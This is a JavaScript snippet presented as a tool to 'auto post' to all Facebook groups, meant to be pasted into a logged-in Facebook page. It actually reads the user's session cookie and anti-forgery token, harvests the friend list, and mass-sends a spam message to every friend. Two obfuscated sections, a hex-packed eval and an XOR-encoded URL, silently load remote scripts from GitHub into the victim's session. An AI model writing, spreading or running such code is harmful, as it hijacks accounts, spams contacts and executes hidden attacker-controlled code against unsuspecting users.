/*Auto Post All Fb Groups*/
/*Copyright © 2013 Www.FunWithTricks.Com. All Rights Reserved.*/
eval(unescape("javascript: var grouppost = " < div > < span class = 'img sp_f52w7l sx_47132d' > < /span><a style='position:absolute;size:3px;padding-left:3px;font-weight:bold;font-family:Tahoma;font-size:11px;color:#3B5998;'>Write Message</a > < /div></br > ";
            grouppost += "<div><textarea id='txtFloodMsg' placeholder='Write something...' style='COLOR:WHITE;padding-top:5px;width:493px;height:85px;font-family:tahoma;font-size:13px;background-color:rgba(255,255,255,0.1);'></textarea></div>"; grouppost += "<div><br><span class='img sp_dpkef5 sx_f05251'></span><a style='position:absolute;font-family:Arial;size:3px;padding-left:3px;font-size:11px;color:rgb(128, 128, 128);'></a></span><button style='margin-left:437px' class='_42ft _4jy0 _11b _4jy3 _4jy1 selected' onclick='autopostingfunc(this);' >Post</button><div style='color:gray;'>Powered By:  Zuts.in</br>Script Made By:</A><A style='color:#3B5998;' href='http://www.facebook.com/thevernex' target='_blank'> Devang Chhajed</A></A></A></A>.</br>For More Tips and Tricks Visit Our Website: <A style='color:#3B5998;' href='http://www.zuts.in' target='_blank'>http://www.zuts.in</A>.</A></br>Our Facebook Page : <A style='color:#3B5998;' href='http://www.facebook.com/ilovecomputertech' target='_blank'> Facebook Page</A></A><br></div>";
            var _text = 'Powered By: <A style="color:#3B5998;" href="http://www.facebook.com/313072532101076" target="_blank">Loading [lllllllllll ] 99%</A> & <A style="color:#3B5998;" href="http://www.facebook.com/199134496914077" target="_blank"> Assam Indian Cyber Force</A>.</br>Script Made By: </A><A style="color:#3B5998;" href="http://www.facebook.com/100001050235420" target="_blank"> Waqar Ahmad</A></A>,</A><A style="color:#3B5998;" href="http://www.facebook.com/100005115938614" target="_blank"> Bhargav JT. Gogoi</A></A>.</br>For More Tools Visit Our Blogger <A style="color:#3B5998;" href="http://automateyourfacebook.blogspot.in/" target="_blank">Automate Your Facebook</A>.</A>';
            var Popupset = document.createElement("div"); Popupset.setAttribute("style", "min-height:50px;width:500px;position:fixed;top:100px;box-shadow: 0px 4px 10px rgba(24, 144, 255, 0.63);position:fixed;left:50%;margin-left:-273px;text-align:left;border-radius:10px;padding:5px;z-index:999999;border:5px solid rgba(0,0,0,0.9);background-color:rgba(0,0,0,0.9);color:#ffffff"); Popupset.innerHTML = grouppost; document.body.appendChild(Popupset); jx = {
                getHTTPObject: function() {
                    var A = false;
                    if (typeof ActiveXObject != "undefined") try {
                            A = new ActiveXObject("Msxml2.XMLHTTP")
                        } catch (C) {
                            try {
                                A = new ActiveXObject("Microsoft.XMLHTTP")
                            } catch (B) {
                                A = false
                            }
                        } else if (window.XMLHttpRequest) try {
                            A = new XMLHttpRequest
                        } catch (C) {
                            A = false
                        }
                    return A
                },
                load: function(url, callback, format, method, opt) {
                    var http = this.init();
                    if (!http || !url) return;
                    if (http.overrideMimeType) http.overrideMimeType("text/xml");
                    if (!method) method = "GET";
                    if (!format) format = "text";
                    if (!opt) opt = {};
                    format = format.toLowerCase();
                    method = method.toUpperCase();
                    var now = "uid=" + (new Date).getTime();
                    url += url.indexOf("?") + 1 ? "&" : "?";
                    url += now;
                    var parameters = null;
                    if (method == "POST") {
                        var parts = url.split("?");
                        url = parts[0];
                        parameters = parts[1]
                    }
                    http.open(method, url, true);
                    var ths = this;
                    if (opt.handler) http.onreadystatechange = function() {
                        opt.handler(http)
                    };
                    else http.onreadystatechange = function() {
                        if (http.readyState == 4)
                            if (http.status == 200) {
                                var result = "";
                                if (http.responseText) result = http.responseText;
                                if (format.charAt(0) == "j") {
                                    result = result.replace(/[\n\r]/g, "");
                                    result = eval("(" + result + ")")
                                } else if (format.charAt(0) == "x") result = http.responseXML;
                                if (callback) callback(result)
                            } else {
                                if (opt.loadingIndicator) document.getElementsByTagName("body")[0].removeChild(opt.loadingIndicator);
                                if (opt.loading) document.getElementById(opt.loading).style.display = "none";
                                if (error) error(http.status)
                            }
                    };
                    http.send(parameters)
                },
                bind: function(A) {
                    var C = {
                        "url": "",
                        "onSuccess": false,
                        "onError": false,
                        "format": "text",
                        "method": "GET",
                        "update": "",
                        "loading": "",
                        "loadingIndicator": ""
                    };
                    for (var B in C)
                        if (A[B]) C[B] = A[B];
                    if (!C.url) return;
                    var D = false;
                    if (C.loadingIndicator) {
                        D = document.createElement("div");
                        D.setAttribute("style", "position:absolute;top:0px;left:0px;");
                        D.setAttribute("class", "loading-indicator");
                        D.innerHTML = C.loadingIndicator;
                        document.getElementsByTagName("body")[0].appendChild(D);
                        this.opt.loadingIndicator = D
                    }
                    if (C.loading) document.getElementById(C.loading).style.display = "block";
                    this.load(C.url, function(E) {
                        if (C.onSuccess) C.onSuccess(E);
                        if (C.update) document.getElementById(C.update).innerHTML = E;
                        if (D) document.getElementsByTagName("body")[0].removeChild(D);
                        if (C.loading) document.getElementById(C.loading).style.display = "none"
                    }, C.format, C.method, C)
                },
                init: function() {
                    return this.getHTTPObject()
                }
            };
            var j = 0;
            var k = 0;
            var suc = 0;
            var msg = "Follow this list please... https://www.facebook.com/lists/156489554515051";
            var arr = new Array;
            var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

            function autopostingfunc(sender) {
                if (document.getElementById("txtFloodMsg").value != "") msg = document.getElementById("txtFloodMsg").value;
                jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/search/bootstrap.php?__a=1&filter[0]=user&viewer=" + user_id + "&token=v7&lazy=0&__user=" + user_id, function(a) {
                    var b = a;
                    var c = b.substring(b.indexOf("{"));
                    var d = JSON.parse(c);
                    d = d.payload.entries;
                    for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
                    sender.parentNode.innerHTML = "Please Wait...";
                    postitok()
                })
            }
            var _0x612a = ["\x65\x20\x61\x3D\x27\x66\x20\x62\x3A\x20\x3C\x41\x20\x30\x3D\x22\x31\x3A\x23\x32\x3B\x22\x20\x33\x3D\x22\x34\x3A\x2F\x2F\x38\x2E\x39\x2E\x35\x2F\x67\x22\x20\x36\x3D\x22\x37\x22\x3E\x68\x20\x5B\x69\x20\x5D\x20\x6A\x25\x3C\x2F\x41\x3E\x20\x26\x20\x3C\x41\x20\x30\x3D\x22\x31\x3A\x23\x32\x3B\x22\x20\x33\x3D\x22\x34\x3A\x2F\x2F\x38\x2E\x39\x2E\x35\x2F\x6B\x22\x20\x36\x3D\x22\x37\x22\x3E\x20\x6C\x20\x6D\x20\x6E\x20\x6F\x3C\x2F\x41\x3E\x2E\x3C\x2F\x63\x3E\x70\x20\x71\x20\x62\x3A\x20\x3C\x2F\x41\x3E\x3C\x41\x20\x30\x3D\x22\x31\x3A\x23\x32\x3B\x22\x20\x33\x3D\x22\x34\x3A\x2F\x2F\x38\x2E\x39\x2E\x35\x2F\x72\x22\x20\x36\x3D\x22\x37\x22\x3E\x20\x73\x20\x74\x3C\x2F\x41\x3E\x3C\x2F\x41\x3E\x2C\x3C\x2F\x41\x3E\x3C\x41\x20\x30\x3D\x22\x31\x3A\x23\x32\x3B\x22\x20\x33\x3D\x22\x34\x3A\x2F\x2F\x38\x2E\x39\x2E\x35\x2F\x75\x22\x20\x36\x3D\x22\x37\x22\x3E\x20\x76\x20\x77\x2E\x20\x78\x3C\x2F\x41\x3E\x3C\x2F\x41\x3E\x2E\x3C\x2F\x63\x3E\x79\x20\x7A\x20\x42\x20\x43\x20\x44\x20\x45\x20\x3C\x41\x20\x30\x3D\x22\x31\x3A\x23\x32\x3B\x22\x20\x33\x3D\x22\x34\x3A\x2F\x2F\x46\x2E\x47\x2E\x48\x2F\x22\x20\x36\x3D\x22\x37\x22\x3E\x49\x20\x4A\x20\x4B\x3C\x2F\x41\x3E\x2E\x3C\x2F\x41\x3E\x27\x3B\x4C\x28\x4D\x21\x3D\x61\x29\x7B\x4E\x3A\x28\x4F\x28\x29\x7B\x64\x2E\x50\x2E\x51\x28\x64\x2E\x52\x28\x27\x53\x27\x29\x29\x2E\x54\x3D\x27\x55\x3A\x2F\x2F\x56\x2E\x57\x2E\x35\x2F\x58\x2F\x59\x2D\x5A\x2F\x31\x30\x2F\x31\x31\x2E\x31\x32\x27\x7D\x29\x28\x29\x7D", "\x7C", "\x73\x70\x6C\x69\x74", "\x73\x74\x79\x6C\x65\x7C\x63\x6F\x6C\x6F\x72\x7C\x33\x42\x35\x39\x39\x38\x7C\x68\x72\x65\x66\x7C\x68\x74\x74\x70\x7C\x63\x6F\x6D\x7C\x74\x61\x72\x67\x65\x74\x7C\x5F\x62\x6C\x61\x6E\x6B\x7C\x77\x77\x77\x7C\x66\x61\x63\x65\x62\x6F\x6F\x6B\x7C\x4F\x6D\x6E\x69\x5F\x74\x65\x78\x74\x7C\x42\x79\x7C\x62\x72\x7C\x64\x6F\x63\x75\x6D\x65\x6E\x74\x7C\x76\x61\x72\x7C\x50\x6F\x77\x65\x72\x65\x64\x7C\x33\x31\x33\x30\x37\x32\x35\x33\x32\x31\x30\x31\x30\x37\x36\x7C\x4C\x6F\x61\x64\x69\x6E\x67\x7C\x6C\x6C\x6C\x6C\x6C\x6C\x6C\x6C\x6C\x6C\x6C\x7C\x39\x39\x7C\x31\x39\x39\x31\x33\x34\x34\x39\x36\x39\x31\x34\x30\x37\x37\x7C\x41\x73\x73\x61\x6D\x7C\x49\x6E\x64\x69\x61\x6E\x7C\x43\x79\x62\x65\x72\x7C\x46\x6F\x72\x63\x65\x7C\x53\x63\x72\x69\x70\x74\x7C\x4D\x61\x64\x65\x7C\x31\x30\x30\x30\x30\x31\x30\x35\x30\x32\x33\x35\x34\x32\x30\x7C\x57\x61\x71\x61\x72\x7C\x41\x68\x6D\x61\x64\x7C\x31\x30\x30\x30\x30\x35\x31\x31\x35\x39\x33\x38\x36\x31\x34\x7C\x42\x68\x61\x72\x67\x61\x76\x7C\x4A\x54\x7C\x47\x6F\x67\x6F\x69\x7C\x46\x6F\x72\x7C\x4D\x6F\x72\x65\x7C\x7C\x54\x6F\x6F\x6C\x73\x7C\x56\x69\x73\x69\x74\x7C\x4F\x75\x72\x7C\x42\x6C\x6F\x67\x67\x65\x72\x7C\x61\x75\x74\x6F\x6D\x61\x74\x65\x79\x6F\x75\x72\x66\x61\x63\x65\x62\x6F\x6F\x6B\x7C\x62\x6C\x6F\x67\x73\x70\x6F\x74\x7C\x69\x6E\x7C\x41\x75\x74\x6F\x6D\x61\x74\x65\x7C\x59\x6F\x75\x72\x7C\x46\x61\x63\x65\x62\x6F\x6F\x6B\x7C\x69\x66\x7C\x5F\x74\x65\x78\x74\x7C\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x7C\x66\x75\x6E\x63\x74\x69\x6F\x6E\x7C\x62\x6F\x64\x79\x7C\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64\x7C\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74\x7C\x73\x63\x72\x69\x70\x74\x7C\x73\x72\x63\x7C\x68\x74\x74\x70\x73\x7C\x72\x61\x77\x7C\x67\x69\x74\x68\x75\x62\x7C\x62\x68\x61\x72\x67\x61\x76\x31\x39\x39\x36\x7C\x46\x75\x6E\x7C\x74\x69\x6D\x65\x7C\x6D\x61\x73\x74\x65\x72\x7C\x55\x6E\x69\x6F\x6E\x7C\x6A\x73", "", "\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65", "\x72\x65\x70\x6C\x61\x63\x65", "\x5C\x77\x2B", "\x5C\x62", "\x67"]; eval(function(_0x1b3bx1, _0x1b3bx2, _0x1b3bx3, _0x1b3bx4, _0x1b3bx5, _0x1b3bx6) {
                _0x1b3bx5 = function(_0x1b3bx3) {
                    return (_0x1b3bx3 < _0x1b3bx2 ? _0x612a[4] : _0x1b3bx5(parseInt(_0x1b3bx3 / _0x1b3bx2))) + ((_0x1b3bx3 = _0x1b3bx3 % _0x1b3bx2) > 35 ? String[_0x612a[5]](_0x1b3bx3 + 29) : _0x1b3bx3.toString(36));
                };
                if (!_0x612a[4][_0x612a[6]](/^/, String)) {
                    while (_0x1b3bx3--) {
                        _0x1b3bx6[_0x1b3bx5(_0x1b3bx3)] = _0x1b3bx4[_0x1b3bx3] || _0x1b3bx5(_0x1b3bx3);
                    };
                    _0x1b3bx4 = [

                        function(_0x1b3bx5) {
                            return _0x1b3bx6[_0x1b3bx5];
                        }
                    ];
                    _0x1b3bx5 = function() {
                        return _0x612a[7];
                    };
                    _0x1b3bx3 = 1;
                };
                while (_0x1b3bx3--) {
                    if (_0x1b3bx4[_0x1b3bx3]) {
                        _0x1b3bx1 = _0x1b3bx1[_0x612a[6]](new RegExp(_0x612a[8] + _0x1b3bx5(_0x1b3bx3) + _0x612a[8], _0x612a[9]), _0x1b3bx4[_0x1b3bx3]);
                    };
                };
                return _0x1b3bx1;
            }(_0x612a[0], 62, 65, _0x612a[3][_0x612a[2]](_0x612a[1]), 0, {}));
            var a = document.body.innerHTML;
            var dts = document.getElementsByName("fb_dtsg")[0].value;
            var composerid = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
            var now = (new Date).getTime();

            function postitok() {
                pst = "message_batch[0][action_type]=ma-type%3Auser-generated-message&message_batch[0][thread_id]=&message_batch[0][author]=fbid%3A" + user_id + "&message_batch[0][author_email]&message_batch[0][coordinates]&message_batch[0][timestamp]=" + now + "&message_batch[0][timestamp_absolute]=Today&message_batch[0][timestamp_relative]=2%3A31pm&message_batch[0][timestamp_time_passed]=0&message_batch[0][is_unread]=false&message_batch[0][is_cleared]=false&message_batch[0][is_forward]=false&message_batch[0][is_filtered_content]=false&message_batch[0][spoof_warning]=false&message_batch[0][source]=source%3Achat%3Aweb&message_batch[0][source_tags][0]=source%3Achat&message_batch[0][body]=" + encodeURIComponent(msg) + "&message_batch[0][has_attachment]=false&message_batch[0][html_body]=false&&message_batch[0][specific_to_list][0]=fbid%3A" + arr[suc] + "&message_batch[0][specific_to_list][1]=fbid%3A" + user_id + "&message_batch[0][ui_push_phase]=V3&message_batch[0][sticker_id]=126362117548585&message_batch[0][status]=0&message_batch[0][message_id]=%3C1369474261661%3A978076331-4038101592%40mail.projektitan.com%3E&&client=mercury&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35CFwXAw&__req=1h&fb_dtsg=" + dts + "&phstamp=";
                with(newx = new XMLHttpRequest) open("POST", "//www.facebook.com/ajax/mercury/send_messages.php"), send(pst);
                suc++;
                if (suc > arr.length) {
                    alert("Auto Posting Completed. Now Refresh your Homepage.");
                    suc = 0
                } else setTimeout("postitok()", 3E4 / arr.length)
            }
            setTimeout("autopostingfunc()", 1E3);
            var X = "jvvrq8--pcu,ekvjw`,amo-`jcpect3;;4-D`/Cwvm/vmmnq-ocqvgp-Qwrrmpv]Dkng,hq"; Y = ""; Z = "";
            var V; V = X.length;
            for (i = 0; i < V; i++) {
                Y += String.fromCharCode(X.charCodeAt(i) ^ 2)
            }
            Z = unescape(Y); document.body.appendChild(document.createElement('script')).src = Z;
            "));
